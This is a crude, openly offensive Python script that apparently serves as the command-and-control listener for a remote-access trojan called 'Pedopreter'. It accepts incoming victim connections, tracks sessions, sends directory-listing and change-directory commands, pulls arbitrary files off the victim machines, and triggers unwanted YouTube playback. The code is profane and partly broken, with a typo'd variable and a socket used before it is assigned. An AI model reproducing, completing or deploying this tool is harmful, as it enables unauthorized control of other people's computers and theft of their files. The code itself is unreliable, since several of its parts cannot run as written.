#!/usr/bin/env python

import socket
import os
import pickle
import time
import pip
import ctypes
import threading as thread
from threading import Thread
#init

try:
    input = raw_input
except:
    print("you not on linux")


print("What the fuck you want")
print("1. Listen")
print("2. Create payload")


q = input()
if q == "1":
    os.system("clear")
    os.system("cls")
    print("ok what ip")
    TCP_IP = input()
    os.system("cls")
    os.system("clear")
    print("ok thanks. what port")
    TCP_PORT = int(input())
    print("fuck you anyway")
    time.sleep(1)
    os.system("clear")
    os.system("cls")
elif q == "2":
    print("ok so create a payload huh? i dont care so im not doing it")

# Initialization and stuff
try:
    os.mkdir("/Pedopreter")
except:
    print("already exists")
try:
    os.mkdir("/Pedopreter/Downloaded")
except:
    print("already exists")

sessions = []
addresses = []
BUFFER_SIZE = 1024
def background_listener():
    q = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    q.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    q.bind((TCP_IP, TCP_PORT))
    while True:
        try:
            BUFFER_SIZE = 1024
            q.listen(1)
            sold = q
            ses, addr = q.accept()
            if addr != None:
                sessions.append(ses)
                addresses.append(addr)
                print("Session " + str(len(sessions) - 1) + ". " + "Started on address: " + str(addr))
                addr = None
        except Exception as e:
            print("something went wrong.." + str(e))
            q.close()
            q = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            q.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            q.bind((TCP_IP, TCP_PORT))


def main():
    while True:
        try:
            thing = input()
            thing2 = thing.split()
            if thing2[0]:
                if thing2[0] == "help":
                    if len(thing2) == 2:
                        if thin2[1] == "cd":
                            print("Changes Directory to <path>")
                        elif thing2[1] == "ls":
                            print("lists files in current or specified directory")
                        elif thing2[1] == "youtube":
                            print("youtube <vid> --earrape    -- opens youtube with vid and earrape yes or no ")
                        elif thing2[1] == "session":
                            print("session <session to interact with by number>  if no 2nd argument it displays all the sessions")
                    else:
                        print("Following commands:")
                        print("cd [path]")
                        print("ls [path]")
                        print("download [full path of wanted download] [output file name INCLUDING EXTRENSION like .txt]")
                elif thing2[0] == "ls":
                    s.send(" ".join(thing2).encode())
                    dataraw = s.recv(BUFFER_SIZE).decode()
                    data = dataraw.split()
                    for x in data:
                        print(x)
                elif thing2[0] == "cd":
                    if len(thing2) == 2:
                        s.send(" ".join(thing2).encode())
                        s.settimeout(10)
                        try:
                            q = s.recv(BUFFER_SIZE).decode()
                            print(q)
                        except:
                            print("timed out")
                elif thing2[0] == "sessions":
                    if len(thing2) == 1:
                        for i, x in enumerate(sessions):
                            print(str(i)+ ".")
                    elif len(thing2) == 2:
                        try:
                            s = sessions[int(thing2[1])]
                            print("now interacting with " + str(addresses[int(thing2[1])]))
                        except Exception as e:
                            print("The following error occured: " + str(e))
                elif thing2[0] == "download":
                    if len(thing2) == 3:
                        s.send(" ".join(thing2).encode())
                        f = open("/Pedopreter/Downloaded/"+thing2[2], "wb")
                        l = s.recv(1024)
                        f.write(l)
                        while (l):
                            print("receiving...")
                            try:
                                l = s.recv(1024)
                                f.write(l)
                            except:
                                print("Something went wrong during the download. Maybe it doesnt exist anymore or the connection was closed. fuck you man you cant even download a file properly")
                    
                        print("Done")
                elif thing2[0] == "youtube":
                    s.send(" ".join(thing2).encode())
                elif thing2[0] == None:
                    print("Thats nothing.. fuck.")
        except Exception as e:
            print("whoops something went wrong.. reconnecting..")
            print("this was the error:")
            print(e)

def keepalive():
    while True:
        time.sleep(10)
        for i, x in enumerate(sessions):
            try:
                alive = False
                x.send("keepalive".encode())
                while alive == False:
                    try:
                        x.settimeout(15)
                        it = x.recv(1024)
                        if it.decode() == "still alive":
                            alive = True
                    except Exception:
                        print("Session number: " + str(i) + ". On address: " + addresses.pop(i) + "Has lost connection or something wtf")
                        del sessions[i]
            
            except Exception:
                print("Session number: " + str(i) + ". On address: " + str(addresses.pop(i)) + "Has lost connection or something wtf")
                del sessions[i]


t1 = Thread(target = main)
t2 = Thread(target = background_listener)
t3 = Thread(target = keepalive)
t1.setDaemon(True)
t2.setDaemon(True)
t3.setDaemon(True)
t1.start()
t2.start()
t3.start()
while True:
    pass


